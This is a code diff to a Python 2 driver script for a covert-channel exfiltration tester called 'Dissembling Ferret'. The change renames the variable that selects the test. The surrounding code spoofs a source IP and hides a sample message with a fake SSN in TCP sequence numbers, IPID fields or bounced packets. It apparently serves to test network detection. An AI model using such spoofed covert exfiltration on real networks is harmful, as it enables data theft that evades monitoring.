@@ -90,7 +90,7 @@ parser.add_option("-s", "--spoof", dest="spoof_ip", default="66.249.66.1",
                     help="Spoof the source IP address as this value")
 parser.add_option("-p", "--port", dest="dstport", default="80",
                     help="Destination port (port for Dissembling Ferret server listener)")
-parser.add_option("-t", "--test", dest="test", default="all",
+parser.add_option("-t", "--test", dest="runtest", default="all",
                     help="Test(s) to run <all|seq|ipid|bounce>")
 parser.add_option("-m", "--mode", dest="mode", default="demo",
                     help="Demo or live mode - send packets slowly or immediately")
@@ -99,6 +99,7 @@ parser.add_option("-m", "--mode", dest="mode", default="demo",
 destination = options.destination_ip
 spoof = options.spoof_ip
 dstport = int(options.dstport)
+runtest = options.runtest
 mode = options.mode
 
 # Validate all the user input
@@ -148,13 +149,13 @@ message = 'foo bar 111-22-3333' + ' from ' + thishost
 print '[+] destination: ' + destination
 
 # ==== use iseq
-if test == 'seq' or test == 'all':
+if runtest == 'seq' or runtest == 'all':
     print '[*] Testing: initial sequence number..'
     initialSeqFerret.exfil_iseq(spoof, destination, dstport, message, bounce=0)
     print '[*] Done: initial sequence number'
 
 # ==== use IPID
-if test == 'ipid' or test == 'all':
+if runtest == 'ipid' or runtest == 'all':
     print '[*] Testing: IPID..'
     ipidFerret.exfil_ipid(spoof, destination, dstport, message)
     print '[*] Done: IPID'
@@ -166,7 +167,7 @@ The things that are different when performing a bounce scan are:
 - dst = host to bounce off of (see spoof addresses above)
 - message stored in ACKs not SEQ.
 '''
-if test == 'bounce' or test == 'all':
+if runtest == 'bounce' or runtest == 'all':
     print '[*] Testing: bounce..'
     initialSeqFerret.exfil_iseq(spoof, destination, dstport, message, bounce=1)
     print '[*] Done: bounce'
